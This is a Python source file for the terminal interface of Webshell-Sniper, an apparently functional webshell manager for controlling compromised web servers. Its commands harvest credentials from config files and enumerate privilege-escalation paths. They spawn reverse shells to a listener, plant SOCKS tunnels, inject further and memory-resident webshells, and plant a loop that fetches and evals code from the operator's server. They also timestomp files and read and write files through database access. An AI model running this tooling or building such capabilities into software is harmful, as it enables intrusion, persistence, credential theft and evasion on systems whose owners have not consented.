"""Interactive command loop, built on :mod:`cmd2`.

Commands follow a namespaced ``<group> <action>`` scheme — capability groups
(``recon`` / ``file`` / ``pivot`` / ``inject``) are single commands carrying
argparse sub-commands, while session-control verbs (``cd``, ``pwd``, ``exec``,
``local``, ``remote``, ``save``, ``history``, ``version``) stay flat.  cmd2 gives
us persistent history, tab-completion and ``help`` for free.

Safety: bare input runs on the **target** by default; ``!cmd`` always runs
locally and ``exec cmd`` always runs remotely.  The prompt carries a coloured
LOCAL/REMOTE chip plus the client-tracked cwd so the active target is never
ambiguous.
"""

from __future__ import annotations

import contextlib
import importlib.metadata
import os
import shlex
import subprocess
import sys
import tempfile
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from pathlib import Path

import cmd2
from cmd2 import Cmd2ArgparseError, Cmd2ArgumentParser, with_argparser
from rich.style import Style

from . import __version__, log
from .config import Config
from .core.webshell import WebShell
from .exceptions import WebshellError
from .features import database, enum, files, inject, portscan, recon, revshell, tunnel
from .session import Session
from .utils.network import get_ip_address

BANNER_TEMPLATE = r"""
===================================================
           ____        _
          / ___| _ __ (_)_ __   ___ _ __
          \___ \| '_ \| | '_ \ / _ \ '__|
           ___) | | | | | |_) |  __/ |
          |____/|_| |_|_| .__/ \___|_|
                      |_|
==================================================={title}
|  https://github.com/WangYihang/Webshell-Sniper  |
===================================================
"""


def _banner() -> str:
    text = f"WebShell Manager Via Terminal (v{__version__})"
    return BANNER_TEMPLATE.format(title="\n|" + text.center(49) + "|")


_REMOTE_STYLE = Style(color="black", bgcolor="green", bold=True)
_LOCAL_STYLE = Style(color="white", bgcolor="red", bold=True)
_DB_STYLE = Style(color="white", bgcolor="blue", bold=True)
_RC_TTL = 5.0  # seconds: remote-completion directory cache lifetime


class Repl(cmd2.Cmd):
    prompt = "sniper => "  # replaced by _refresh_prompt() before the loop starts

    def __init__(
        self, webshells: list[WebShell], config: Config, session: Session | None = None
    ):
        super().__init__(allow_cli_args=False)
        self.session = session or Session(webshells)
        self.config = config
        self.intro = _banner()
        self._rc_cache: dict[str, tuple[float, list[str]]] = {}
        for name in ("edit", "macro", "run_pyscript", "run_script", "shortcuts"):
            self.hidden_commands.append(name)
        self.aliases.update({"exit": "quit"})
        self._load_plugins()
        self._refresh_prompt()

    # -- session-backed state (kept as properties so command bodies are simple)
    @property
    def webshells(self) -> list[WebShell]:
        return self.session.shells

    @property
    def cwd(self) -> str:
        return self.session.cwd

    @cwd.setter
    def cwd(self, value: str) -> None:
        self.session.cwd = value

    @property
    def local_exec(self) -> bool:
        return self.session.local_exec

    @local_exec.setter
    def local_exec(self, value: bool) -> None:
        self.session.local_exec = value

    def _load_plugins(self) -> None:
        """Register third-party command sets from the ``webshell_sniper.commands``
        entry-point group (see docs/plugins.md). Failures are non-fatal."""
        for entry in importlib.metadata.entry_points(group="webshell_sniper.commands"):
            try:
                self.register_command_set(entry.load()())
                log.info(f"Loaded plugin: {entry.name}")
            except Exception as exc:  # noqa: BLE001 - a bad plugin must not crash startup
                log.warning(f"Plugin {entry.name!r} failed to load: {exc}")

    # -- prompt ---------------------------------------------------------------
    def _refresh_prompt(self) -> None:
        """Rebuild the prompt so the active exec target is always visible."""
        if self.local_exec:
            chip = cmd2.stylize(" LOCAL ", _LOCAL_STYLE)
        else:
            chip = cmd2.stylize(" REMOTE ", _REMOTE_STYLE)
        cwd = self.cwd or "~"
        count = f" ×{len(self.webshells)}" if len(self.webshells) > 1 else ""
        self.prompt = f"{chip} {cwd}{count} > "

    def preloop(self) -> None:
        self._refresh_prompt()

    def postcmd(self, stop, line):  # noqa: ANN001, ANN201 - cmd2 hook
        self._refresh_prompt()
        return stop

    # -- helpers --------------------------------------------------------------
    def _each(self, action, label: str) -> None:
        """Run ``action(ws)`` against every live webshell, isolating failures.

        Runs concurrently when ``--workers`` > 1 and there's more than one shell.
        """

        def run(ws: WebShell) -> None:
            log.info(f"[{label}] {ws}")
            try:
                action(ws)
            except WebshellError as exc:
                log.error(f"{label} failed: {exc}")

        if self.config.workers > 1 and len(self.webshells) > 1:
            with ThreadPoolExecutor(max_workers=self.config.workers) as pool:
                list(pool.map(run, self.webshells))
        else:
            for ws in self.webshells:
                run(ws)

    @staticmethod
    def _ask(prompt: str, default: str) -> str:
        suffix = f" ({default})" if default else ""
        return input(f"{prompt}{suffix}: ").strip() or default

    def _interactive(self) -> bool:
        """True when we may safely block on ``input()`` (a real TTY, not a pipe)."""
        return sys.stdin.isatty()

    def _resolve(self, value, prompt: str, default: str | None = None):
        """Return a required value: the flag if given, else prompt on a TTY,
        else raise cleanly so batch/piped runs don't hang on ``input()``."""
        if value is not None:
            return value
        if self._interactive():
            return self._ask(prompt, default or "")
        raise Cmd2ArgparseError(
            f"missing required value: {prompt} — provide it as a flag in non-interactive mode"
        )

    def _resolve_optional(self, value, prompt: str, default: str = ""):
        """Like :meth:`_resolve` but defaults silently instead of erroring."""
        if value is not None:
            return value
        if self._interactive():
            return self._ask(prompt, default)
        return default

    def _confirm(self, prompt: str) -> bool:
        return self._interactive() and input(f"{prompt} [y/N]: ").strip().lower() == "y"

    def _render_list(self, fn, label: str, header: str) -> None:
        """Run a pure list-returning recon function per shell and render it."""

        def run(ws: WebShell) -> None:
            items = fn(ws)
            if items:
                log.success(f"{header}:\n" + "\n".join(f"\t[{i}]" for i in items))
            else:
                log.warning(f"No {header.lower()} found.")

        self._each(run, label)

    # -- remote-path completion -----------------------------------------------
    def _remote_listing(self, directory: str) -> list[str]:
        """List a remote directory's entries (cached briefly to spare the target)."""
        now = time.monotonic()
        hit = self._rc_cache.get(directory)
        if hit and now - hit[0] < _RC_TTL:
            return hit[1]
        if not self.webshells:
            return []
        ws = self.webshells[0]
        base = directory or self.cwd or ws.webroot or "."
        try:
            out = ws.run_command(f"ls -1ap {shlex.quote(base)} 2>/dev/null")
        except WebshellError:
            return []
        names = [ln for ln in out.splitlines() if ln and ln not in ("./", "../")]
        self._rc_cache[directory] = (now, names)
        return names

    def _complete_remote_path(self, text, line, begidx, endidx):  # noqa: ANN001, ANN201
        """Tab-complete a remote path against the first webshell."""
        if not getattr(self.config, "remote_complete", True):
            return []
        sep = text.rfind("/")
        directory, prefix = (text[: sep + 1], text[sep + 1 :]) if sep >= 0 else ("", text)
        return [directory + n for n in self._remote_listing(directory) if n.startswith(prefix)]

    def _complete_local_path(self, text, line, begidx, endidx):  # noqa: ANN001, ANN201
        return self.path_complete(text, line, begidx, endidx)

    def _invalidate_remote_cache(self) -> None:
        self._rc_cache.clear()

    # ========================================================================
    # recon
    # ========================================================================
    _recon_parser = Cmd2ArgumentParser(prog="recon", description="Target reconnaissance.")
    _rsub = _recon_parser.add_subparsers(title="actions", metavar="<action>")
    _rsub.add_parser("info", help="target summary (URL/webroot/php/kernel)").set_defaults(fn="_recon_info")
    _rsub.add_parser("php", help="PHP version").set_defaults(fn="_recon_php")
    _rsub.add_parser("kernel", help="kernel version (uname -a)").set_defaults(fn="_recon_kernel")
    _rsub.add_parser("configs", help="find config/DB files in the webroot").set_defaults(fn="_recon_configs")
    _rsub.add_parser("writable", help="find writable directories").set_defaults(fn="_recon_writable")
    _rsub.add_parser("writable-php", help="find writable .php files").set_defaults(fn="_recon_writable_php")
    _rsub.add_parser("disabled", help="list PHP disabled_functions").set_defaults(fn="_recon_disabled")
    _rsub.add_parser("suid", help="find SUID-root binaries").set_defaults(fn="_recon_suid")
    _rsub.add_parser("privesc", help="aggregate privesc enumeration").set_defaults(fn="_recon_privesc")
    _rsub.add_parser("creds", help="harvest credentials from config files").set_defaults(fn="_recon_creds")

    @with_argparser(_recon_parser)
    def do_recon(self, args) -> None:
        """Target reconnaissance — run `recon` for the action list."""
        self._dispatch(args, self._recon_parser)

    def _recon_info(self, _) -> None:
        for ws in self.webshells:
            log.success("=" * 40)
            log.success(f"URL           : {ws.url}")
            log.success(f"Method        : {ws.method}")
            log.success(f"Document root : {ws.webroot}")
            log.success(f"PHP version   : {ws.php_version}")
            log.success(f"Kernel        : {ws.kernel_version}")

    def _recon_php(self, _) -> None:
        self._each(lambda ws: log.success(ws.php_version), "php-version")

    def _recon_kernel(self, _) -> None:
        self._each(lambda ws: log.success(ws.kernel_version), "kernel-version")

    def _recon_configs(self, _) -> None:
        self._render_list(recon.find_config_files, "config", "Config/DB files")

    def _recon_writable(self, _) -> None:
        self._render_list(recon.find_writable_dirs, "writable-dirs", "Writable directories")

    def _recon_writable_php(self, _) -> None:
        self._render_list(recon.find_writable_php, "writable-php", "Writable PHP files")

    def _recon_disabled(self, _) -> None:
        def run(ws: WebShell) -> None:
            disabled = recon.get_disabled_functions(ws)
            if disabled:
                log.success("Disabled functions:\n" + "\n".join(f"\t[{f}]" for f in sorted(disabled)))
            else:
                log.warning("No PHP functions are disabled.")

        self._each(run, "disabled-funcs")

    def _recon_suid(self, _) -> None:
        self._render_list(recon.find_suid_binaries, "suid", "SUID binaries")

    def _recon_privesc(self, _) -> None:
        def run(ws: WebShell) -> None:
            for label, output in enum.enumerate_target(ws).items():
                if output:
                    log.success(f"== {label} ==")
                    log.raw(output)

        self._each(run, "enum")

    def _recon_creds(self, _) -> None:
        def run(ws: WebShell) -> None:
            configs = recon.find_config_files(ws)
            found = enum.harvest_credentials(ws, configs)
            if not found:
                log.warning("No credentials found.")
            for path, content in found.items():
                log.success(f"== {path} ==")
                log.raw(content)

        self._each(run, "creds")

    # ========================================================================
    # file
    # ========================================================================
    _file_parser = Cmd2ArgumentParser(prog="file", description="Remote file operations.")
    _fsub = _file_parser.add_subparsers(title="actions", metavar="<action>")
    _p = _fsub.add_parser("ls", help="list a remote directory (table)")
    _p.add_argument("path", nargs="?", completer=_complete_remote_path)
    _p.set_defaults(fn="_file_ls")
    _p = _fsub.add_parser("read", help="read a remote file (default /etc/passwd)")
    _p.add_argument("path", nargs="?", completer=_complete_remote_path)
    _p.set_defaults(fn="_file_read")
    _p = _fsub.add_parser("edit", help="download, open in $EDITOR, upload back")
    _p.add_argument("path", completer=_complete_remote_path)
    _p.set_defaults(fn="_file_edit")
    _p = _fsub.add_parser("get", help="download a file or directory tree")
    _p.add_argument("path", nargs="?", completer=_complete_remote_path)
    _p.add_argument("--find", help="custom find args for a tree, e.g. -size -500k")
    _p.add_argument("--name", help="name filter for a tree download (default *.php)")
    _p.set_defaults(fn="_file_get")
    _p = _fsub.add_parser("put", help="upload a local file to the target(s)")
    _p.add_argument("local", nargs="?", completer=_complete_local_path)
    _p.set_defaults(fn="_file_put")
    _p = _fsub.add_parser("rm", help="delete a remote file (no path → self-delete)")
    _p.add_argument("path", nargs="?", completer=_complete_remote_path)
    _p.set_defaults(fn="_file_rm")
    _p = _fsub.add_parser("mv", help="move/rename a remote file")
    _p.add_argument("src", completer=_complete_remote_path)
    _p.add_argument("dst", completer=_complete_remote_path)
    _p.set_defaults(fn="_file_mv")
    _p = _fsub.add_parser("cp", help="copy a remote file")
    _p.add_argument("src", completer=_complete_remote_path)
    _p.add_argument("dst", completer=_complete_remote_path)
    _p.set_defaults(fn="_file_cp")
    _p = _fsub.add_parser("mkdir", help="create a remote directory (recursive)")
    _p.add_argument("path")
    _p.set_defaults(fn="_file_mkdir")
    _p = _fsub.add_parser("chmod", help="chmod a remote file (octal, e.g. 755)")
    _p.add_argument("mode")
    _p.add_argument("path", completer=_complete_remote_path)
    _p.set_defaults(fn="_file_chmod")
    _p = _fsub.add_parser("touch", help="copy a reference file's timestamps onto a path")
    _p.add_argument("path", completer=_complete_remote_path)
    _p.add_argument("reference", completer=_complete_remote_path)
    _p.set_defaults(fn="_file_touch")
    del _p

    @with_argparser(_file_parser)
    def do_file(self, args) -> None:
        """Remote file operations — run `file` for the action list."""
        self._dispatch(args, self._file_parser)

    def _file_ls(self, args) -> None:
        path = args.path or self.cwd or "."
        for ws in self.webshells:
            log.info(f"[ls] {ws}: {path}")
            try:
                rows = [
                    [f"{e['type']}{e['mode']}", e["size"],
                     datetime.fromtimestamp(e["mtime"]).strftime("%Y-%m-%d %H:%M"), e["name"]]
                    for e in files.list_dir(ws, path)
                ]
            except WebshellError as exc:
                log.error(f"ls failed: {exc}")
                continue
            log.table(["mode", "size", "mtime", "name"], rows)

    def _file_read(self, args) -> None:
        path = args.path or self._resolve(None, "File path", "/etc/passwd")
        self._each(lambda ws: log.raw(files.read_file(ws, path)), "read")

    def _file_edit(self, args) -> None:
        ws = self.webshells[0]
        try:
            data = files.read_bytes(ws, args.path)
        except WebshellError as exc:
            log.error(f"edit: cannot read {args.path}: {exc}")
            return
        with tempfile.NamedTemporaryFile(suffix=f"-{Path(args.path).name}", delete=False) as handle:
            handle.write(data)
            tmp = handle.name
        try:
            subprocess.run([os.environ.get("EDITOR", "vi"), tmp])  # noqa: S603
            files.upload(ws, tmp, args.path)
        finally:
            os.unlink(tmp)

    def _file_get(self, args) -> None:
        for ws in self.webshells:
            path = self._resolve(args.path, "Remote path", ws.webroot)
            log.info(f"[download] {ws}")
            try:
                if args.find:
                    files.download_tree(ws, path, find_args=args.find, output_dir=self.config.output_dir)
                elif files.is_directory(ws, path):
                    name = self._resolve_optional(args.name, "Name filter", "*.php")
                    files.download_tree(ws, path, name, output_dir=self.config.output_dir)
                else:
                    files.download(ws, path, self.config.output_dir)
            except WebshellError as exc:
                log.error(f"download failed: {exc}")

    def _file_put(self, args) -> None:
        local = self._resolve(args.local, "Local path", None)
        if not local or not Path(local).is_file():
            log.error("Local file not found.")
            return
        for ws in self.webshells:
            remote = self._ask(f"Remote path on {ws.url}", f"{ws.webroot}/{Path(local).name}")
            log.info(f"[upload] {ws}")
            try:
                files.upload(ws, local, remote)
            except WebshellError as exc:
                log.error(f"upload failed: {exc}")
        self._invalidate_remote_cache()

    def _file_rm(self, args) -> None:
        path = args.path
        if path is None:
            if not self._interactive():
                log.error("Refusing to self-delete in non-interactive mode; pass a path.")
                return
            if not self._confirm("Delete the webshell ITSELF (you lose access)?"):
                log.info("Aborted.")
                return
        self._each(lambda ws: files.remove(ws, path), "remove")
        self._invalidate_remote_cache()

    def _file_mv(self, args) -> None:
        self._each(lambda ws: log.success(f"mv: {files.move(ws, args.src, args.dst)}"), "mv")
        self._invalidate_remote_cache()

    def _file_cp(self, args) -> None:
        self._each(lambda ws: log.success(f"cp: {files.copy_file(ws, args.src, args.dst)}"), "cp")
        self._invalidate_remote_cache()

    def _file_mkdir(self, args) -> None:
        self._each(lambda ws: log.success(f"mkdir: {files.make_dir(ws, args.path)}"), "mkdir")
        self._invalidate_remote_cache()

    def _file_chmod(self, args) -> None:
        self._each(lambda ws: log.success(f"chmod: {files.chmod_path(ws, args.path, args.mode)}"), "chmod")

    def _file_touch(self, args) -> None:
        self._each(lambda ws: files.timestomp(ws, args.path, args.reference), "timestomp")

    # ========================================================================
    # pivot
    # ========================================================================
    _pivot_parser = Cmd2ArgumentParser(prog="pivot", description="Lateral movement and tunnelling.")
    _psub = _pivot_parser.add_subparsers(title="actions", metavar="<action>")
    _p = _psub.add_parser("scan", help="port-scan a CIDR range from the target")
    _p.add_argument("--hosts", help="CIDR range, e.g. 192.168.1.0/24")
    _p.add_argument("--ports", help="comma-separated port list")
    _p.add_argument("--banner", action="store_true", help="grab banners")
    _p.set_defaults(fn="_pivot_scan")
    _p = _psub.add_parser("shell", help="spawn a reverse shell back to you")
    _p.add_argument("-i", "--ip", help="listener IP")
    _p.add_argument("-p", "--port", type=int, help="listener port")
    _p.add_argument("-m", "--method", default="auto",
                    choices=["auto", "socat", "nc", "bash", "python", "perl", "php"])
    _p.add_argument("--listen", action="store_true", help="spawn a local listener first")
    _p.add_argument("--tool", default="nc", choices=["nc", "socat"], help="local listener tool")
    _p.set_defaults(fn="_pivot_shell")
    _p = _psub.add_parser("pty", help="print steps to upgrade a dumb shell to a PTY")
    _p.add_argument("shell", nargs="?", default="/bin/bash")
    _p.set_defaults(fn="_pivot_pty")
    _p = _psub.add_parser("socks", help="plant a tunnel endpoint and open a local SOCKS5 proxy")
    _p.add_argument("port", nargs="?", type=int, help="local SOCKS port (default 1080)")
    _p.set_defaults(fn="_pivot_socks")
    _p = _psub.add_parser("db", help="open the database manager (MySQL/PostgreSQL)")
    _p.add_argument("--engine", choices=["mysql", "pgsql"])
    _p.add_argument("--host")
    _p.add_argument("--user")
    _p.add_argument("--password")
    _p.add_argument("--database")
    _p.set_defaults(fn="_pivot_db")
    del _p

    @with_argparser(_pivot_parser)
    def do_pivot(self, args) -> None:
        """Lateral movement and tunnelling — run `pivot` for the action list."""
        self._dispatch(args, self._pivot_parser)

    def _pivot_scan(self, args) -> None:
        hosts = self._resolve(args.hosts, "Hosts (CIDR)", "192.168.1.0/24")
        ports = self._resolve(args.ports, "Ports", "21,22,80,443,445,3306,3389")
        banner = args.banner or self._confirm("Grab banners?")

        def run(ws: WebShell) -> None:
            log.info(f"Scanning {hosts} for [{ports}]{' with banners' if banner else ''} ...")
            output = portscan.port_scan(ws, hosts, ports, banner).strip()
            if output:
                log.success("Open ports:\n" + output)
            else:
                log.warning("No open ports found.")

        self._each(run, "portscan")

    def _pivot_shell(self, args) -> None:
        ip = self._resolve(args.ip, "Listener IP", get_ip_address())
        port = int(self._resolve(args.port, "Listener port", "8888"))
        listen = args.listen or self._confirm("Spawn a local listener here first?")
        if listen:
            revshell.reverse_shell_with_listener(self.webshells[0], ip, port, args.method, args.tool)
        else:
            log.info(f"Start your listener first, e.g.: nc -lvnp {port}")
            self._each(lambda ws: revshell.reverse_shell(ws, ip, port, args.method), "revshell")

    def _pivot_pty(self, args) -> None:
        log.raw(revshell.pty_upgrade_hints(args.shell))

    def _pivot_socks(self, args) -> None:
        port = args.port if args.port is not None else int(self._resolve(None, "Local SOCKS port", "1080"))
        ws = self.webshells[0]
        try:
            url = tunnel.plant(ws)
        except WebshellError as exc:
            log.error(f"socks: {exc}")
            return
        log.success(f"Tunnel endpoint planted: {url}")
        server = tunnel.serve(url, local_port=port, config=self.config)
        try:
            input("SOCKS5 proxy running — press Enter to stop ...\n")
        finally:
            server.shutdown()
            log.info("SOCKS5 proxy stopped.")

    def _pivot_db(self, args) -> None:
        engine = self._resolve(args.engine, "Engine (mysql/pgsql)", "mysql")
        host = self._resolve(args.host, "Host", "127.0.0.1")
        user = self._resolve(args.user, "Username", "root")
        password = self._resolve(args.password, "Password", "root")
        db = self._resolve_optional(args.database, "Database (blank = default)", "") if engine == "pgsql" else ""
        for ws in self.webshells:
            log.info(f"[database:{engine}] {ws}")
            try:
                client = database.make_client(engine, ws, host, user, password, db)
            except ValueError as exc:
                log.error(str(exc))
                return
            if client.check_connection():
                log.success("Connected.")
                DbRepl(client, self.config).cmdloop()
            else:
                log.error("Database connection failed.")

    # ========================================================================
    # inject
    # ========================================================================
    _inject_parser = Cmd2ArgumentParser(prog="inject", description="Secondary webshell injection.")
    _isub = _inject_parser.add_subparsers(title="actions", metavar="<action>")
    _p = _isub.add_parser("web", help="auto-inject a plain webshell")
    _p.add_argument("--password", help="blank = random per directory")
    _p.set_defaults(fn="_inject_web")
    _p = _isub.add_parser("mem", help="auto-inject a memory-resident webshell")
    _p.add_argument("--password", help="blank = random per directory")
    _p.set_defaults(fn="_inject_mem")
    _p = _isub.add_parser("reaper", help="flag reaper (CTF): loop pulling+eval'ing code")
    _p.add_argument("--host", help="your web server IP")
    _p.add_argument("--port", help="your web server port")
    _p.set_defaults(fn="_inject_reaper")
    del _p

    @with_argparser(_inject_parser)
    def do_inject(self, args) -> None:
        """Secondary webshell injection — run `inject` for the action list."""
        self._dispatch(args, self._inject_parser)

    def _inject_web(self, args) -> None:
        password = self._resolve_optional(args.password, "New password (blank = random per directory)") or None
        self._each(
            lambda ws: inject.inject_webshell(
                ws, password, recon.find_writable_dirs(ws),
                output_dir=self.config.output_dir, verify=True,
            ),
            "inject",
        )

    def _inject_mem(self, args) -> None:
        password = self._resolve_optional(args.password, "New password (blank = random per directory)") or None
        self._each(
            lambda ws: inject.inject_memory_webshell(
                ws, password, recon.find_writable_dirs(ws), output_dir=self.config.output_dir
            ),
            "inject-memory",
        )

    def _inject_reaper(self, args) -> None:
        host = self._resolve(args.host, "Your web server IP", get_ip_address())
        port = self._resolve(args.port, "Your web server port", "80")
        code_url = f"http://{host}:{port}/code.txt"
        self._each(
            lambda ws: inject.flag_reaper(ws, code_url, recon.find_writable_dirs(ws)),
            "flag-reaper",
        )

    # ========================================================================
    # shell / exec (flat session-control verbs)
    # ========================================================================
    def _dispatch(self, args, parser) -> None:
        """Run the sub-command handler, or print the action list if none given."""
        fn = getattr(args, "fn", None)
        if fn is None:
            log.raw(parser.format_help())
            return
        getattr(self, fn)(args)

    def _remote_command(self, ws: WebShell, command: str) -> str:
        """Run a command on the target, honouring the client-tracked cwd."""
        if self.cwd:
            command = f"cd {shlex.quote(self.cwd)} 2>/dev/null; {command}"
        return ws.run_command(command)

    def do_local(self, _: cmd2.Statement) -> None:
        """Route bare (unrecognised) commands to the LOCAL machine."""
        self.local_exec = True
        log.info("Bare commands now run on localhost (the prompt shows LOCAL).")

    def do_remote(self, _: cmd2.Statement) -> None:
        """Route bare (unrecognised) commands to the REMOTE target (default)."""
        self.local_exec = False
        log.info("Bare commands now run on the target (the prompt shows REMOTE).")

    def do_pwd(self, _: cmd2.Statement) -> None:
        """Show the client-tracked remote working directory."""
        log.success(self.cwd or "(server default)")

    _cd_parser = Cmd2ArgumentParser()
    _cd_parser.add_argument("path", nargs="?", default=".", completer=_complete_remote_path)

    @with_argparser(_cd_parser)
    def do_cd(self, args) -> None:
        """cd [path] — change the (client-tracked) remote working directory."""
        arg = args.path or "."
        ws = self.webshells[0]
        base = self.cwd or ws.webroot
        target = arg if arg.startswith("/") else f"{base}/{arg}"
        try:
            resolved = ws.run_command(f"cd {shlex.quote(target)} && pwd").strip()
        except WebshellError as exc:
            log.error(f"cd failed: {exc}")
            return
        if resolved.startswith("/"):
            self.cwd = resolved
            self._invalidate_remote_cache()
            log.success(f"cwd: {self.cwd}")
        else:
            log.error(f"cannot cd to {target}: {resolved or 'no such directory'}")

    def do_exec(self, line: cmd2.Statement) -> None:
        """exec <cmd> — explicitly run a command on the REMOTE target."""
        command = str(line).strip()
        if command:
            self.session.record(f"exec {command}")
            self._each(lambda ws: log.raw(self._remote_command(ws, command)), "exec")

    def default(self, statement: cmd2.Statement) -> None:
        command = statement.raw.strip()
        if not command:
            return
        self.session.record(command)
        if self.local_exec:
            log.info(f"[local] {command}")
            subprocess.run(command, shell=True)  # noqa: S602 - intentional local exec
        else:
            self._each(lambda ws: log.raw(self._remote_command(ws, command)), "remote")

    # ========================================================================
    # session
    # ========================================================================
    def do_history(self, _: cmd2.Statement | str) -> None:
        """Show the commands recorded in this engagement session."""
        if not self.session.history:
            log.warning("No commands recorded yet.")
            return
        for i, command in enumerate(self.session.history, 1):
            log.success(f"{i:>3}  {command}")

    def do_save(self, _: cmd2.Statement) -> None:
        """Snapshot the session (shells + cwd + history) to a JSON file."""
        self._save()

    def do_version(self, _: cmd2.Statement) -> None:
        """Show the Webshell-Sniper version."""
        log.success(f"Webshell-Sniper {__version__}")

    def do_quit(self, _: cmd2.Statement | str) -> bool:
        """Quit (snapshotting the session to a timestamped JSON file)."""
        self._save()
        return True

    def _save(self) -> None:
        out = self.session.save(self.config.output_dir)
        log.info(f"Saved session ({len(self.webshells)} shell(s)) to {out}")


class DbRepl(cmd2.Cmd):
    """Nested shell for the database manager — its own history, help and completion."""

    def __init__(self, client: database.SqlClient, config: Config):
        super().__init__(allow_cli_args=False)
        self.client = client
        self.config = config
        self.prompt = cmd2.stylize(" DB ", _DB_STYLE) + " > "
        for name in ("edit", "macro", "run_pyscript", "run_script", "shortcuts", "shell"):
            self.hidden_commands.append(name)

    @staticmethod
    def _ask(prompt: str, default: str) -> str:
        suffix = f" ({default})" if default else ""
        return input(f"{prompt}{suffix}: ").strip() or default

    def do_databases(self, _: cmd2.Statement) -> None:
        """List databases/schemas."""
        log.table(["Database/Schema"], [[d] for d in self.client.databases()])

    def do_tables(self, _: cmd2.Statement) -> None:
        """List tables in a schema."""
        schema = self._ask("Schema", self.client.current_namespace())
        log.table(["Table"], [[t] for t in self.client.tables(schema)])

    def do_columns(self, _: cmd2.Statement) -> None:
        """List columns of a table."""
        schema = self._ask("Schema", self.client.current_namespace())
        table = input("Table: ").strip()
        log.table(["Column"], [[c] for c in self.client.columns(schema, table)])

    def do_dump(self, _: cmd2.Statement) -> None:
        """Dump rows from a table."""
        schema = self._ask("Schema", self.client.current_namespace())
        table = input("Table: ").strip()
        limit = int(self._ask("Limit", "50"))
        cols, rows = self.client.dump(schema, table, limit)
        if rows:
            log.table(cols or [f"col{i}" for i in range(len(rows[0]))], rows)
        else:
            log.warning("No rows.")

    def do_csv(self, _: cmd2.Statement) -> None:
        """Export a table to a local CSV file."""
        schema = self._ask("Schema", self.client.current_namespace())
        table = input("Table: ").strip()
        out = self.config.output_dir / f"{schema}.{table}.csv"
        n = self.client.export_csv(schema, table, out)
        log.success(f"Exported {n} row(s) -> {out}")

    def do_query(self, line: cmd2.Statement) -> None:
        """query <sql> — run raw SQL (prompts if no argument is given)."""
        sql = str(line).strip() or input("SQL: ").strip()
        rows = self.client.query(sql)
        if rows:
            log.table([f"col{i}" for i in range(len(rows[0]))], rows)
        else:
            log.warning("No rows.")

    def do_readfile(self, line: cmd2.Statement) -> None:
        """readfile <path> — read a file from the DB server's filesystem."""
        path = str(line).strip() or input("Server file path: ").strip()
        log.raw(self.client.read_server_file(path))

    def do_writefile(self, _: cmd2.Statement) -> None:
        """Write a local file onto the DB server's filesystem."""
        local = input("Local file: ").strip()
        remote = input("Server destination path: ").strip()
        ok = self.client.write_server_file(remote, Path(local).read_bytes())
        log.success(f"write_server_file: {ok}")

    def do_user(self, _: cmd2.Statement) -> None:
        """Show the current DB user."""
        log.success(self.client.current_user())

    def do_version(self, _: cmd2.Statement) -> None:
        """Show the DB server version."""
        log.success(self.client.version())

    def do_current(self, _: cmd2.Statement) -> None:
        """Show the current database/namespace."""
        log.success(self.client.current_namespace())

    def do_quit(self, _: cmd2.Statement | str) -> bool:
        """Return to the main shell."""
        return True

    def onecmd_plus_hooks(self, *args, **kwargs):  # noqa: ANN002, ANN003, ANN201
        """Surface WebshellError as a clean message instead of a traceback."""
        try:
            return super().onecmd_plus_hooks(*args, **kwargs)
        except WebshellError as exc:
            log.error(str(exc))
            return False


# Group commands in `help` output (best-effort; tolerate cmd2 API differences).
with contextlib.suppress(Exception):
    cmd2.categorize(
        [Repl.do_recon, Repl.do_file, Repl.do_pivot, Repl.do_inject],
        "Capabilities",
    )
    cmd2.categorize(
        [Repl.do_cd, Repl.do_pwd, Repl.do_exec, Repl.do_local, Repl.do_remote],
        "Shell",
    )
    cmd2.categorize(
        [Repl.do_history, Repl.do_save, Repl.do_version, Repl.do_quit],
        "Session",
    )
